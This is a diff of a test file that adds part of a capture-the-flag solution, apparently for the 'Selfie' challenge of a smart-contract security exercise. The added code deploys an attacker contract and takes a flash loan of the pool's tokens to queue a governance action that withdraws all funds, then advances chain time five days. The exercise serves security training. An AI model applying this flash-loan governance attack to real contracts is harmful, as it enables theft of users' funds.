@@ -31,6 +31,14 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // use flash loan to queue an action for the governance that withdraws all the funds to your account
+        const AttackerFactory = await ethers.getContractFactory('Attacker', deployer);
+        console.log('governance address ', this.governance.address)
+        this.attackContract = await AttackerFactory.deploy(this.governance.address)
+        console.log(`Pool address ${await this.pool.address}`)
+        await this.attackContract.requestFlashLoan(await this.pool.address, TOKENS_IN_POOL)
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
     });
 
     after(async function () {
